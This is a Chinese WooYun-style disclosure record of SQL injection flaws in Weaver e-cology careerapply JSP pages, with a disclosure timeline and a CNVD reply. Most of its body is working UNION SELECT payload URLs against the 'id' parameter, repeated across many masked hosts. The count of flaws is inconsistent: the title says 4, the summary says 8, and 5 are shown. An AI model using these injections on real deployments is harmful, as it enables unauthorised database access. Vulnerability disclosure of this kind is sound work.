wybug_title: 泛微e-cology通用型4处SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-09-02：	细节已通知厂商并且等待厂商处理中									2015-09-05：	厂商已经确认，细节仅向厂商公开									2015-09-08：	细节向第三方安全合作伙伴开放									2015-10-30：	细节向核心白帽子及相关领域专家公开									2015-11-09：	细节向普通白帽子公开									2015-11-19：	细节向实习白帽子公开									2015-12-04：	细节向公众公开  简要描述： 泛微e-cology通用型8处SQL注入漏洞 详细说明：  也是个老系统了，很多人提交过了#1 注入点 /pweb/careerapply/HrmCareerApplyPerEdit.jsp，参数id，可union这套系统有用MSSQL，也有ORACLE，下面演示MSSQL的例如 **.**.**.**:99/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7

其他案例还有**.**.**.**/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**:88/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7http://**.**.**.**:800/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7http://**.**.**.**:8080/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**:8635/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**:8086/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7#2 注入点 /pweb/careerapply/HrmCareerApplyPerView.jsp，参数id，可union例如 **.**.**.**:99/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7

其他案例还有**.**.**.**/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**:88/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7http://**.**.**.**:800/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7http://**.**.**.**:8080/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**:8635/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7**.**.**.**:8086/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7#3 注入点 /pweb/careerapply/HrmCareerApplyWorkEdit.jsp，参数id，可union这套系统有用MSSQL，也有ORACLE，下面演示MSSQL的例如 **.**.**.**:99/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6

其他案例还有**.**.**.**/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**:88/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6http://**.**.**.**:800/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6http://**.**.**.**:8080/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**:8635/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**:8086/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6#4 注入点 /pweb/careerapply/HrmCareerApplyWorkView.jsp，参数id，可union这套系统有用MSSQL，也有ORACLE，下面演示MSSQL的例如 **.**.**.**:99/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6

其他案例还有**.**.**.**/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**:88/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6http://**.**.**.**:800/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6http://**.**.**.**:8080/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**:8635/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6**.**.**.**:8086/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6   漏洞证明：  #5 注入点 /web/careerapply/HrmCareerApplyPerEdit.jsp，参数id，可union这套系统有用MSSQL，也有ORACLE，下面演示MSSQL的例如 **.**.**.**:99/web/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-09-05 08:45 厂商回复： CNVD确认并复现所述情况，由CNVD按以往联系渠道向软件生产厂商通报（未获反馈） 最新状态： 暂无
